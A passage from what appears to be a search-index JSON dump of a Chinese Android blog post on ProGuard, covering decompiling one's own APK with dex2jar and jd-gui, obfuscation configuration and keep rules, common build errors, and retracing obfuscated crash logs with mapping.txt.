\u662f\u4f01\u4e1a\u771f\u5b9e\u7684\u9879\u76ee\u4e2d\uff0c\u5982\u679c\u4e0d\u7ecf\u8fc7\u4ee3\u7801\u6df7\u6dc6\uff0c\u4f60\u7684\u6e90\u7801\u5c31\u5982\u6b64\u8d64\u88f8\u88f8\u7684\u66b4\u9732\u7740\u3002\u8fd9\u6837\u5bf9\u4e8e\u516c\u53f8\u6765\u8bf4\u662f\u975e\u5e38\u4e0d\u5b89\u5168\u7684\uff0c\u5e76\u4e14\u4e0d\u60f3\u53d1\u751f\u7684\u60c5\u51b5\u3002\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u770b\u89c1\u4e86\u53cd\u7f16\u8bd1\u5982\u6b64\u7684\u5a01\u529b\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u4ec0\u4e48\u529e\u6cd5\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u770b\u4e0b\u9762\u8bb2\u89e3\u3002 \u4e8c\u3001\u4ee3\u7801\u6df7\u6dc6 1.\u51c6\u5907\u5de5\u4f5c \u9996\u5148\uff0c\u6211\u4eec\u5f97\u5c06\u6211\u4eec\u7684\u9879\u76ee\u6e90\u7801\u3001proguard\u5de5\u5177\uff08\u653e\u5fc3\u8fd9\u4e2a\u5de5\u5177Google\u5df2\u7ecf\u5728sdk\u4e2d\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\uff0c\u5728sdk\\tools\u76ee\u5f55\u4e0b\u53ef\u4ee5\u770b\u5230\uff09\u3001proguard.cfg\u6587\u4ef6\uff08\u8be5\u6587\u4ef6\u5b9a\u4e49\u4e86\u6df7\u6dc6\u7684\u89c4\u5219\uff0c\u521b\u5efa2.3\u4ee5\u4e0a\u9879\u76ee\u81ea\u52a8\u751f\u6210\uff0c\u6216\u8005\u5728\u7f51\u4e0a\u53ef\u4ee5\u5f88\u5bb9\u6613\u4e0b\u8f7d\u5230\uff09\u3002 2.\u5728\u4f60\u7684\u9879\u76ee\u4e2d\u6dfb\u52a0proguard.cfg\u6587\u4ef6 \u8be5\u6587\u4ef6Google\u516c\u53f8\u5df2\u7ecf\u4e3a\u6211\u4eec\u51c6\u5907\u597d\u4e86\uff0c\u521b\u5efa\u9879\u76ee\u65f6\uff0c\u5728\u9879\u76ee\u7684\u6839\u76ee\u5f55\u4e0b\u5c31\u6709\u4e86\uff0c\u4f46\u662f\u662f\u4ece2.3\u5f00\u59cb\u7684\u3002\u4e0d\u8fc7\u6211\u4eec\u57fa\u4e8e2.2\u7684\u9879\u76ee\u53ea\u9700\u8981\u5c06\u8be5\u6587\u4ef6\u62f7\u8d1d\u5230\u9879\u76ee\u6839\u76ee\u5f55\u4e0b\u5373\u53ef\u3002 3.\u4fee\u6539\u9879\u76ee\u7684default.properties\u914d\u7f6e\u6587\u4ef6 Android\u9879\u76ee\u9ed8\u8ba4\u5728\u6253\u5305\u7684\u65f6\u5019\u662f\u4e0d\u6df7\u6dc6\u4ee3\u7801\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u5f97\u5728default.properties\u6587\u4ef6\u4e2d\uff0c\u6dfb\u52a0\u8be5\u914d\u7f6e\uff1aproguard.config=proguard.cfg\u3002 4.\u8fdb\u884capk\u6253\u5305 \u597d\u4e86\uff0c\u4e00\u5207\u5c31\u7eea\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u6309\u7740\u5e73\u5e38\u7684\u6253\u5305\u6b65\u9aa4\uff0c\u8fdb\u884c\u6253\u5305\u64cd\u4f5c\u3002\u6253\u5b8c\u5305\u540e\uff0c\u6211\u4eec\u4f7f\u7528\u4e0a\u9762\u8bb2\u8ff0\u7684\u53cd\u7f16\u8bd1\u65b9\u6cd5\uff0c\u67e5\u770b\u73b0\u5728\u7684jar\u6587\u4ef6\u3002 \u4f1a\u53d1\u73b0\uff0c\u6df7\u6dc6\u4e86\u8bb8\u591aaa\u3001bb\u3001cc\u7684\u5305\u3001aa\u3001bb\u3001cc\u7684\u7c7b\u548c\u65b9\u6cd5\uff0c\u8fd9\u6837\u7684\u4ee3\u7801\u6839\u672c\u65e0\u6cd5\u9605\u8bfb\uff0c\u4e5f\u5c31\u8fbe\u5230\u4e86\u6211\u4eec\u4fdd\u62a4\u6e90\u4ee3\u7801\u7684\u76ee\u7684\u4e86\u3002 \u4e09\u3001produard.cfg\u6587\u4ef6 \u6211\u4eec\u5728\u770b\u770bproduard.cfg\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u4e2d\u63cf\u8ff0\u4e86\u6df7\u6dc6\u4ee3\u7801\u7684\u89c4\u5219\uff0c\u4f60\u5982\u679c\u60f3\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u6765\u6df7\u6dc6\u4ee3\u7801\uff0c\u5c31\u53ef\u4ee5\u5728\u672c\u6587\u4ef6\u4e2d\u7f16\u5199\u4f60\u7684\u6df7\u6dc6\u89c4\u5219\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8be5\u6587\u4ef6\u7684\u5185\u5bb9\u5982\u4e0b\uff1a -optimizationpasses5 -dontusemixedcaseclassnames//\u6df7\u6dc6\u65f6\u4e0d\u4f1a\u4ea7\u751f\u5f62\u5f62\u8272\u8272\u7684\u7c7b\u540d -dontskipnonpubliclibraryclasses//\u6307\u5b9a\u4e0d\u53bb\u5ffd\u7565\u975e\u516c\u5171\u7684\u7c7b\u5e93 -dontpreverify//\u4e0d\u9884\u6821\u9a8c -verbose -optimizations !code/simplification/arithmetic,!field/*,!class/merging/*//\u4f18\u5316 //\u4e0d\u8fdb\u884c\u6df7\u6dc6\u4fdd\u6301\u539f\u6837 -keep public class * extends android.app.Activity -keep public class * extends android.app.Application -keep public class * extends android.app.Service -keep public class * extends android.content.BroadcastReceiver -keep public class * extends android.content.ContentProvider -keep public class * extends android.app.backup.BackupAgentHelper -keep public class * extends android.preference.Preference -keep public class com.android.vending.licensing.ILicensingService //\u4fdd\u62a4\u6307\u5b9a\u7684\u7c7b\u548c\u7c7b\u7684\u6210\u5458\u7684\u540d\u79f0\uff0c\u5982\u679c\u6240\u6709\u6307\u5b9a\u7684\u7c7b\u6210\u5458\u51fa\u5e2d -keepclasseswithmembernamesclass * { native <methods>; } //\u4fdd\u62a4\u6307\u5b9a\u7684\u7c7b\u548c\u7c7b\u7684\u6210\u5458\uff0c\u4f46\u6761\u4ef6\u662f\u6240\u6709\u6307\u5b9a\u7684\u7c7b\u548c\u7c7b\u6210\u5458\u662f\u8981\u5b58\u5728 -keepclasseswithmembersclass * { public <init>(android.content.Context, android.util.AttributeSet); } -keepclasseswithmembersclass * { public <init>(android.content.Context, android.util.AttributeSet,int); } //\u4fdd\u62a4\u6307\u5b9a\u7c7b\u7684\u6210\u5458\uff0c\u5982\u679c\u6b64\u7c7b\u53d7\u5230\u4fdd\u62a4\u4ed6\u4eec\u4f1a\u4fdd\u62a4\u7684\u66f4\u597d -keepclassmembersclass * extends android.app.Activity { public void *(android.view.View); } -keepclassmembersenum* { public static **[] values(); public static **valueOf(java.lang.String); } //\u4fdd\u62a4\u6307\u5b9a\u7684\u7c7b\u6587\u4ef6\u548c\u7c7b\u6210\u5458 -keep class * implements android.os.Parcelable{ public static final android.os.Parcelable$Creator*; } \u56db\u3001\u53ef\u80fd\u51fa\u73b0\u7684\u95ee\u9898 1.\u56e0\u4e3a\u4f7f\u7528\u4e86\u5347\u7ea7\u540e\u4f7f\u7528android-support-v4\u800c\u53d1\u751f\u6df7\u6dc6\u9519\u8bef\uff0c\u65e0\u6cd5\u6253\u5305\u51fa\u73b0\u5982\u4e0b\u9519\u8bef\uff1a Unexpected error while evaluating instruction: Class = [android/support/v4/view/AccessibilityDelegateCompat$AccessibilityDelegateJellyBeanImpl] Method = [newAccessiblityDelegateBridge(Landroid/support/v4/view/AccessibilityDelegateCompat;)Ljava/lang/Object;] Instruction = [18]areturn Exception = 1 (Can't find any super classes of [android/support/v4/view/AccessibilityDelegateCompatIcs$1] (not even immediate super class [android/view/View$AccessibilityDelegate])) Unexpected error while performing partial evaluation: Class = [android/support/v4/view/AccessibilityDelegateCompat$AccessibilityDelegateJellyBeanImpl] Method = [newAccessiblityDelegateBridge(Landroid/support/v4/view/AccessibilityDelegateCompat;)Ljava/lang/Object;] Exception = 1 (Can't find any super classes of [android/support/v4/view/AccessibilityDelegateCompatIcs$1] (not even immediate super class [android/view/View$AccessibilityDelegate])) java.lang.IllegalArgumentException: Can't find any super classes of [android/support/v4/view/AccessibilityDelegateCompatIcs$1] (not even immediate super class [android/view/View$AccessibilityDelegate]) at proguard.evaluation.value.ReferenceValue.generalize(ReferenceValue.java:287) \u4f60\u9700\u8981\u5728proguard.cfg\u6587\u4ef6\u4e2d\u6dfb\u52a0\u5982\u4e0b\u4ee3\u7801\uff1a -libraryjars libs/android-support-v4.jar -dontwarnandroid.support.v4.** -keep class android.support.v4.** { *; } -keep interface android.support.v4.app.** { *; } -keep public class * extends android.support.v4.** -keep public class * extends android.app.Fragment 2.\u5982\u679c\u4f60\u4f7f\u7528\u4e86\u7b2c\u4e09\u65b9\u7684\u5305\uff0c\u4f60\u9700\u8981\u4f7f\u7528\u4e00\u4e0b\u914d\u7f6e\uff0c\u8ba9ProGuard\u77e5\u9053\u5e93\u4e2d\u7684\u4e00\u4e9b\u7c7b\u5e76\u4e0d\u662f\u5728\u6240\u6709\u7684API\u4e2d\u53ef\u7528\uff1a -libraryjars libs/roboguice-2.0.jar -dontwarnroboguice.** 3.\u5728\u6253\u5305\u7684\u8fc7\u7a0b\u4e2d\uff0c\u51fa\u73b0\u5982\u4e0b\u9519\u8bef\uff1a Proguardreturned with error code 1. See console [2012-09-25 09:50:39 - estore3601] Error: @C:\\Users\\hp\\AppData\\Local\\Temp\\android_5192919586673521494.pro (\u6587\u4ef6\u540d\u3001\u76ee\u5f55\u540d\u6216\u5377\u6807\u8bed\u6cd5\u4e0d\u6b63\u786e\u3002) \u4f60\u9700\u8981\u7cfb\u5728ProGuard\u6700\u65b0\u7248\u672c\uff0c\u5982v4.8\u3002\u7136\u540e\u89e3\u538bproduard4.8.zip\u6587\u4ef6\uff0c\u5c06bin\u548clib\u4e24\u4e2a\u6587\u4ef6\u5939\u8986\u76d6sdk\u76ee\u5f55\\tool\\proguard\u76ee\u5f55\u4e2d\u540c\u540d\u7684\u6587\u4ef6\u5939\u3002 \u4e94\u3001\u53cd\u6df7\u6dc6\u5d29\u6e83\u65e5\u5fd7 \u5728\u5b9e\u9645\u5de5\u4f5c\u4e2d\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u4e00\u4e0b\u5f00\u6e90\u7684\u7cfb\u7edf\uff08\u5982ACRA\uff09\u76d1\u63a7\u548c\u6536\u96c6\u5d29\u6e83\u65e5\u5fd7\uff0c\u4f46\u662f\u7531\u4e8e\u6b63\u5f0f\u7248\u672c\u7684\u53d1\u5e03\u4e3a\u4e86\u9632\u6b62\u53cd\u7f16\u8bd1\u7b49\u65b9\u9762\u7684\u8003\u8651\uff0c\u4f1a\u4f7f\u7528ProGuard\u7684\u65b9\u5f0f\u4ee3\u7801\u6df7\u6dc6\u3002\u6536\u96c6\u4e0a\u6765\u7684\u65e5\u5fd7\u5982\u4e0b\u7684\u6df7\u6dc6\uff0cat com.example.atom.hotel.a.c.f.a(SourceFile:66)\uff0c\u4e0d\u5229\u4e8e\u95ee\u9898\u7684\u5206\u6790\u3002 java.lang.IndexOutOfBoundsException: Invalid index 0, size is 0 at java.util.ArrayList.throwIndexOutOfBoundsException(ArrayList.java:255) at java.util.ArrayList.get(ArrayList.java:308) at com.example.atom.hotel.a.c.f.a(SourceFile:66) at com.example.atom.hotel.a.c.f.<init>(SourceFile:60) \u5176\u5b9e\uff0c\u6211\u4eec\u65e2\u7136\u53ef\u4ee5\u9002\u5e94ProGuad\u8fdb\u884c\u6df7\u6dc6\uff0c\u90a3\u4e48\u5e94\u8be5\u53ef\u4ee5\u60f3\u5230\u53ef\u4ee5\u53cd\u6df7\u6dc6\u56de\u6765\u3002\u518d\u4f7f\u7528ProGuard\u6df7\u6dc6\u4ee3\u7801\u6253\u5305\u7684\u65f6\u5019\uff0c\u4f1a\u751f\u751f\u4e00\u4e2amapping.txt\u6587\u4ef6\u3002\u8fd9\u4e2a\u6587\u4ef6\u8bb0\u5f55\u4e86\u6df7\u6dc6\u524d\u540e\u7684\u7c7b\u3001\u65b9\u6cd5\u7b49\u6620\u5c04\u5173\u7cfb\u3002\u901a\u8fc7{sdk-dir}\\tools\\proguard\\bin\u76ee\u5f55\u4e0b\u7684retrace.bat\u5de5\u5177\u53cd\u6df7\u6dc6\uff0c\u6267\u884c\u547d\u4ee4\uff1aretract.bat -verbose mapping.txt obfuscated_tract.txt > out_tract.txt\u3002\u7ed3\u679c\u8f93\u51fa\u5982\u4e0b\uff1a java.lang.IndexOutOfBoundsException: Invalid index 0, size is 0 at java.util.ArrayList.throwIndexOutOfBoundsException(ArrayList.java:255) at java.util.ArrayList.get(ArrayList.java:308) at com.example.atom.hotel.delegate.HotelListDelegateAdapter.void initSpecialPreferentialTips(boolean)(SourceFile:66) at com.example.atom.hotel.delegate.HotelListDelegateAdapter.<init>(SourceFile:60) \u65b0\u6280\u672f\uff0c\u65b0\u672a\u6765\uff01\u6b22\u8fce\u5927\u5bb6\u5173\u6ce8 \u201c1024\u5de5\u573a\u201d\u5fae\u4fe1\u670d\u52a1\u53f7 \uff0c\u65f6\u523b\u5173\u6ce8\u6211\u4eec\u7684\u6700\u65b0\u7684\u6280\u672f\u8baf\u606f\uff01 \uff08\u752d\u5ba2\u6c14\uff01\u5c3d\u60c5\u7684\u626b\u63cf\u6216\u8005\u957f\u6309\uff01\uff09 \ufeff\ufeff \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/p106786860/article/details/11974863","title":"\u65e5\u79ef\u6708\u7d2f\uff1aProguard\u8fdb\u884c\u6e90\u4ee3\u7801\u6df7\u6dc6\u548c\u5d29\u6e83\u65e5\u5fd7\u53cd\u6df7\u6dc6"},{"location":"Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/#proguard","text":"\u5728\u5b9e\u9645\u7684\u5f00\u53d1\u6210\u4ea7\u54c1apk\u7684\u53d1\u5e03\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u4f7f\u7528\u5230\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002\u4e0d\u8fc7\u5728\u8bb2\u89e3\u5982\u4f55\u8fdb\u884c\u4ee3\u7801\u6df7\u6dc6\u4e4b\u524d\uff0c\u6211\u5148\u8ddf\u5927\u5bb6\u6f14\u793a\u4e00\u4e0b\u53cd\u7f16\u8bd1\u7684\u8fc7\u7a0b\uff0c\u8fd9\u6837\u624d\u80fd\u8ba9\u5927\u5bb6\u660e\u767d\u4e3a\u4ec0\u4e48\u9700\u8981\u8fdb\u884c\u4ee3\u7801\u6df7\u6dc6\u3002","title":"\u65e5\u79ef\u6708\u7d2f\uff1aProguard\u8fdb\u884c\u6e90\u4ee3\u7801\u6df7\u6dc6\u548c\u5d29\u6e83\u65e5\u5fd7\u53cd\u6df7\u6dc6"},{"location":"Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/#_1","text":"1.\u51c6\u5907\u5de5\u4f5c \u9996\u5148\u6211\u4eec\u51c6\u5907\u597d\u4e00\u4e2a\u9879\u76ee\u7684apk\u6587\u4ef6\uff08\u672a\u8fdb\u884c\u6df7\u6dc6\u6253\u5305\uff09\u3001dex2jar\u5de5\u5177\uff08\u4e0b\u8f7d\u5730\u5740\uff1a http://code.google.com/p/dex2jar/ \uff09\u3001jd-gui\u5de5\u5177\uff08\u4e0b\u8f7d\u5730\u5740\uff1a http://jd-gui.softpedia.com/ \uff09\u3002 2.\u83b7\u53d6CodeMixTest.apk\u4e2d\u7684classes.dex\u6587\u4ef6 \u5c06CodeMixTest.apk\u89e3\u538b\uff0c\u8fd9\u91cc\u6211\u4eec\u4e3a\u4e86\u65b9\u4fbf\u5c31\u76f4\u63a5\u89e3\u538b\u5230\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u3002\u5728\u89e3\u538b\u51fa\u7684\u6587\u4ef6\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u89c1\u6709\u4e00\u4e2aclasses.dex\u6587\u4ef6\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u7684\u6e90\u4ee3\u7801\u6253\u5305\u751f\u6210\u7684\u6587\u4ef6\u3002 3.\u4f7f\u7528dex2jar\u5de5\u5177\u8fd8\u539fjar\u6587\u4ef6 dex2jar\u5de5\u5177\u7684\u4f5c\u7528\u5c31\u662f\u5c06class.dex\u6587\u4ef6\u8fd8\u539f\u6210.jar\u6587\u4ef6\u3002\u5148\u5c06dex2jar-0.0.9.15.zip\u89e3\u538b\uff0c\u7136\u540e\u5c06\u4e0a\u9762\u83b7\u5f97\u7684classes.dex\u6587\u4ef6\u62f7\u8d1d\u81f3\u89e3\u538b\u7684\u76ee\u5f55\u4e2d\u3002 \u67e5\u770b\u89e3\u538b\u76ee\u5f55\u4e2d\uff0c\u6709dex2jar.bat\u6587\u4ef6\u3002 \u542f\u52a8cmd\uff0c\u8fdb\u5165\u5230dex2jar\u5de5\u5177\u89e3\u538b\u7684\u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c\u547d\u4ee4\uff1adex2jar.bat classes.dex\uff0c\u6709\u5982\u4e0b\u7ed3\u679c\u3002 \u67e5\u770bdex2jar\u5de5\u5177\u89e3\u538b\u7684\u76ee\u5f55\u4e2d\uff0c\u751f\u6210\u4e86\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684classes_dex2jar.jar\u6587\u4ef6\u3002 4.\u4f7f\u7528jd-gui\u5de5\u5177\u67e5\u770bjar\u6587\u4ef6 \u5c06jd-gui-0.3.5.windows.zip\u5de5\u5177\u89e3\u538b\uff0c\u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u76f4\u63a5\u89e3\u538b\u5230\u5f53\u524d\u6587\u4ef6\u5939\uff0c\u6211\u4eec\u4f1a\u770b\u89c1\u4e00\u4e2ajd-gui.exe\u6587\u4ef6\u3002 \u53cc\u51fbjd-gui.exe\uff0c\u4f7f\u7528\u5de5\u5177\u6253\u5f00\u524d\u9762\u6211\u4eec\u83b7\u5f97\u7684classes_dex2jar.jar\u6587\u4ef6\u3002\u53ef\u4ee5\u6e05\u695a\u7684\u770b\u89c1\u6e90\u4ee3\u7801\u3002 \u662f\u4f01\u4e1a\u771f\u5b9e\u7684\u9879\u76ee\u4e2d\uff0c\u5982\u679c\u4e0d\u7ecf\u8fc7\u4ee3\u7801\u6df7\u6dc6\uff0c\u4f60\u7684\u6e90\u7801\u5c31\u5982\u6b64\u8d64\u88f8\u88f8\u7684\u66b4\u9732\u7740\u3002\u8fd9\u6837\u5bf9\u4e8e\u516c\u53f8\u6765\u8bf4\u662f\u975e\u5e38\u4e0d\u5b89\u5168\u7684\uff0c\u5e76\u4e14\u4e0d\u60f3\u53d1\u751f\u7684\u60c5\u51b5\u3002\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u770b\u89c1\u4e86\u53cd\u7f16\u8bd1\u5982\u6b64\u7684\u5a01\u529b\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u4ec0\u4e48\u529e\u6cd5\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u770b\u4e0b\u9762\u8bb2\u89e3\u3002","title":"\u4e00\u3001\u4ee3\u7801\u53cd\u7f16\u8bd1"},{"location":"Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/#_2","text":"1.\u51c6\u5907\u5de5\u4f5c \u9996\u5148\uff0c\u6211\u4eec\u5f97\u5c06\u6211\u4eec\u7684\u9879\u76ee\u6e90\u7801\u3001proguard\u5de5\u5177\uff08\u653e\u5fc3\u8fd9\u4e2a\u5de5\u5177Google\u5df2\u7ecf\u5728sdk\u4e2d\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\uff0c\u5728sdk\\tools\u76ee\u5f55\u4e0b\u53ef\u4ee5\u770b\u5230\uff09\u3001proguard.cfg\u6587\u4ef6\uff08\u8be5\u6587\u4ef6\u5b9a\u4e49\u4e86\u6df7\u6dc6\u7684\u89c4\u5219\uff0c\u521b\u5efa2.3\u4ee5\u4e0a\u9879\u76ee\u81ea\u52a8\u751f\u6210\uff0c\u6216\u8005\u5728\u7f51\u4e0a\u53ef\u4ee5\u5f88\u5bb9\u6613\u4e0b\u8f7d\u5230\uff09\u3002 2.\u5728\u4f60\u7684\u9879\u76ee\u4e2d\u6dfb\u52a0proguard.cfg\u6587\u4ef6 \u8be5\u6587\u4ef6Google\u516c\u53f8\u5df2\u7ecf\u4e3a\u6211\u4eec\u51c6\u5907\u597d\u4e86\uff0c\u521b\u5efa\u9879\u76ee\u65f6\uff0c\u5728\u9879\u76ee\u7684\u6839\u76ee\u5f55\u4e0b\u5c31\u6709\u4e86\uff0c\u4f46\u662f\u662f\u4ece2.3\u5f00\u59cb\u7684\u3002\u4e0d\u8fc7\u6211\u4eec\u57fa\u4e8e2.2\u7684\u9879\u76ee\u53ea\u9700\u8981\u5c06\u8be5\u6587\u4ef6\u62f7\u8d1d\u5230\u9879\u76ee\u6839\u76ee\u5f55\u4e0b\u5373\u53ef\u3002 3.\u4fee\u6539\u9879\u76ee\u7684default.properties\u914d\u7f6e\u6587\u4ef6 Android\u9879\u76ee\u9ed8\u8ba4\u5728\u6253\u5305\u7684\u65f6\u5019\u662f\u4e0d\u6df7\u6dc6\u4ee3\u7801\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u5f97\u5728default.properties\u6587\u4ef6\u4e2d\uff0c\u6dfb\u52a0\u8be5\u914d\u7f6e\uff1aproguard.config=proguard.cfg\u3002 4.\u8fdb\u884capk\u6253\u5305 \u597d\u4e86\uff0c\u4e00\u5207\u5c31\u7eea\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u6309\u7740\u5e73\u5e38\u7684\u6253\u5305\u6b65\u9aa4\uff0c\u8fdb\u884c\u6253\u5305\u64cd\u4f5c\u3002\u6253\u5b8c\u5305\u540e\uff0c\u6211\u4eec\u4f7f\u7528\u4e0a\u9762\u8bb2\u8ff0\u7684\u53cd\u7f16\u8bd1\u65b9\u6cd5\uff0c\u67e5\u770b\u73b0\u5728\u7684jar\u6587\u4ef6\u3002 \u4f1a\u53d1\u73b0\uff0c\u6df7\u6dc6\u4e86\u8bb8\u591aaa\u3001bb\u3001cc\u7684\u5305\u3001aa\u3001bb\u3001cc\u7684\u7c7b\u548c\u65b9\u6cd5\uff0c\u8fd9\u6837\u7684\u4ee3\u7801\u6839\u672c\u65e0\u6cd5\u9605\u8bfb\uff0c\u4e5f\u5c31\u8fbe\u5230\u4e86\u6211\u4eec\u4fdd\u62a4\u6e90\u4ee3\u7801\u7684\u76ee\u7684\u4e86\u3002","title":"\u4e8c\u3001\u4ee3\u7801\u6df7\u6dc6"},{"location":"Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/#produardcfg","text":"\u6211\u4eec\u5728\u770b\u770bproduard.cfg\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u4e2d\u63cf\u8ff0\u4e86\u6df7\u6dc6\u4ee3\u7801\u7684\u89c4\u5219\uff0c\u4f60\u5982\u679c\u60f3\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u6765\u6df7\u6dc6\u4ee3\u7801\uff0c\u5c31\u53ef\u4ee5\u5728\u672c\u6587\u4ef6\u4e2d\u7f16\u5199\u4f60\u7684\u6df7\u6dc6\u89c4\u5219\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8be5\u6587\u4ef6\u7684\u5185\u5bb9\u5982\u4e0b\uff1a -optimizationpasses5 -dontusemixedcaseclassnames//\u6df7\u6dc6\u65f6\u4e0d\u4f1a\u4ea7\u751f\u5f62\u5f62\u8272\u8272\u7684\u7c7b\u540d -dontskipnonpubliclibraryclasses//\u6307\u5b9a\u4e0d\u53bb\u5ffd\u7565\u975e\u516c\u5171\u7684\u7c7b\u5e93 -dontpreverify//\u4e0d\u9884\u6821\u9a8c -verbose -optimizations !code/simplification/arithmetic,!field/*,!class/merging/*//\u4f18\u5316 //\u4e0d\u8fdb\u884c\u6df7\u6dc6\u4fdd\u6301\u539f\u6837 -keep public class * extends android.app.Activity -keep public class * extends android.app.Application -keep public class * extends android.app.Service -keep public class * extends android.content.BroadcastReceiver -keep public class * extends android.content.ContentProvider -keep public class * extends android.app.backup.BackupAgentHelper -keep public class * extends android.preference.Preference -keep public class com.android.vending.licensing.ILicensingService //\u4fdd\u62a4\u6307\u5b9a\u7684\u7c7b\u548c\u7c7b\u7684\u6210\u5458\u7684\u540d\u79f0\uff0c\u5982\u679c\u6240\u6709\u6307\u5b9a\u7684\u7c7b\u6210\u5458\u51fa\u5e2d -keepclasseswithmembernamesclass * { native <methods>; } //\u4fdd\u62a4\u6307\u5b9a\u7684\u7c7b\u548c\u7c7b\u7684\u6210\u5458\uff0c\u4f46\u6761\u4ef6\u662f\u6240\u6709\u6307\u5b9a\u7684\u7c7b\u548c\u7c7b\u6210\u5458\u662f\u8981\u5b58\u5728 -keepclasseswithmembersclass * { public <init>(android.content.Context, android.util.AttributeSet); } -keepclasseswithmembersclass * { public <init>(android.content.Context, android.util.AttributeSet,int); } //\u4fdd\u62a4\u6307\u5b9a\u7c7b\u7684\u6210\u5458\uff0c\u5982\u679c\u6b64\u7c7b\u53d7\u5230\u4fdd\u62a4\u4ed6\u4eec\u4f1a\u4fdd\u62a4\u7684\u66f4\u597d -keepclassmembersclass * extends android.app.Activity { public void *(android.view.View); } -keepclassmembersenum* { public static **[] values(); public static **valueOf(java.lang.String); } //\u4fdd\u62a4\u6307\u5b9a\u7684\u7c7b\u6587\u4ef6\u548c\u7c7b\u6210\u5458 -keep class * implements android.os.Parcelable{ public static final android.os.Parcelable$Creator*; }","title":"\u4e09\u3001produard.cfg\u6587\u4ef6"},{"location":"Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/#_3","text":"1.\u56e0\u4e3a\u4f7f\u7528\u4e86\u5347\u7ea7\u540e\u4f7f\u7528android-support-v4\u800c\u53d1\u751f\u6df7\u6dc6\u9519\u8bef\uff0c\u65e0\u6cd5\u6253\u5305\u51fa\u73b0\u5982\u4e0b\u9519\u8bef\uff1a Unexpected error while evaluating instruction: Class = [android/support/v4/view/AccessibilityDelegateCompat$AccessibilityDelegateJellyBeanImpl] Method = [newAccessiblityDelegateBridge(Landroid/support/v4/view/AccessibilityDelegateCompat;)Ljava/lang/Object;] Instruction = [18]areturn Exception = 1 (Can't find any super classes of [android/support/v4/view/AccessibilityDelegateCompatIcs$1] (not even immediate super class [android/view/View$AccessibilityDelegate])) Unexpected error while performing partial evaluation: Class = [android/support/v4/view/AccessibilityDelegateCompat$AccessibilityDelegateJellyBeanImpl] Method = [newAccessiblityDelegateBridge(Landroid/support/v4/view/AccessibilityDelegateCompat;)Ljava/lang/Object;] Exception = 1 (Can't find any super classes of [android/support/v4/view/AccessibilityDelegateCompatIcs$1] (not even immediate super class [android/view/View$AccessibilityDelegate])) java.lang.IllegalArgumentException: Can't find any super classes of [android/support/v4/view/AccessibilityDelegateCompatIcs$1] (not even immediate super class [android/view/View$AccessibilityDelegate]) at proguard.evaluation.value.ReferenceValue.generalize(ReferenceValue.java:287) \u4f60\u9700\u8981\u5728proguard.cfg\u6587\u4ef6\u4e2d\u6dfb\u52a0\u5982\u4e0b\u4ee3\u7801\uff1a -libraryjars libs/android-support-v4.jar -dontwarnandroid.support.v4.** -keep class android.support.v4.** { *; } -keep interface android.support.v4.app.** { *; } -keep public class * extends android.support.v4.** -keep public class * extends android.app.Fragment 